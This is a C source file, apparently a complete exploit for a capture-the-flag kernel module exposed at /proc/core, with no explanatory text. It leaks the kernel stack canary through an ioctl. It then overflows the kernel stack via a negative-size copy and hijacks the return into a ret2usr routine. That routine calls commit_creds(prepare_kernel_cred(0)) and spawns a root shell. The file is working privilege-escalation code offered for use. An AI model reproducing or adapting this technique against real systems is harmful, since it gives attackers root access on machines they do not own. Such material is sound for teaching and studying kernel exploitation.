#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>
void debug(){
    getchar();
}
int fd;
#define SET_OFF 0x6677889c
#define READ 0x6677889b
#define COPY 0x6677889a

void init()
{
	fd = open("/proc/core", O_RDWR);
	if (fd < 0)
		exit(-1);
	puts("[*] init done!");
}
void errExit(const char* msg)
{
	puts(msg);
	exit(-1);
}
void set_off(int64_t offset){
	ioctl(fd,SET_OFF,offset);

}
typedef int __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds ;
prepare_kernel_cred_func prepare_kernel_cred ;
size_t user_cs, user_ss,user_rflags, user_sp ,user_gs,user_es,user_fs,user_ds;
void save_status(){
	__asm__("mov %%cs, %0\n"
	"mov %%ss,%1\n"
	"mov %%rsp,%2\n"
	"pushfq\n"
	"pop %3\n"
	"mov %%gs,%4\n"
	"mov %%es,%5\n"
	"mov %%fs,%6\n"
	"mov %%ds,%7\n"
	::"m"(user_cs),"m"(user_ss),"m"(user_sp),"m"(user_rflags),
	"m"(user_gs),"m"(user_es),"m"(user_fs),"m"(user_ds)
	);
	puts("[*]status has been saved.");
}

void shell(void) {
	if(!getuid())
		system("/bin/sh");
	exit(0);
}

void getroot() {
	commit_creds(prepare_kernel_cred(0));
}
void sudo(){
	getroot();
	asm(
	"push %0\n"
	"push %1\n"
	"push %2\n"
	"push %3\n"
	"push %4\n"
	"push $0\n"
	"swapgs\n"
	"pop %%rbp\n"
	"iretq\n"
	::"m"(user_ss),"m"(user_sp),"m"(user_rflags),"m"(user_cs),"a"(&shell)
	);
}

int main(int argc, char const *argv[]){
	save_status();
	init();
	uint64_t *buffer  = (uint64_t *)malloc(0x40);
	uint64_t kernel_base = 0;
//input the kernel base here
//cat /tmp/kallsyms | grep _text | head -n 1
	scanf("%lx",&kernel_base);
	commit_creds = (commit_creds_func) (kernel_base+0x9c8e0);
	prepare_kernel_cred = (prepare_kernel_cred_func) (kernel_base+0x9cce0);
	set_off(0x40);	
	ioctl(fd,READ,buffer);
	uint64_t canary = buffer[0];
	printf("Leak canary:%lx\n",canary);
	printf("Kernel Base:%lx\n",kernel_base);
	
	buffer[0x40/8] = canary;
	buffer[0x40/8+1] = 0 ;
	buffer[0x40/8+2] =(uint64_t) &sudo;
	write(fd,buffer,0x80);
	uint64_t size = 0xff00000000000060;
	ioctl(fd,COPY,size);

	return 0;	
}

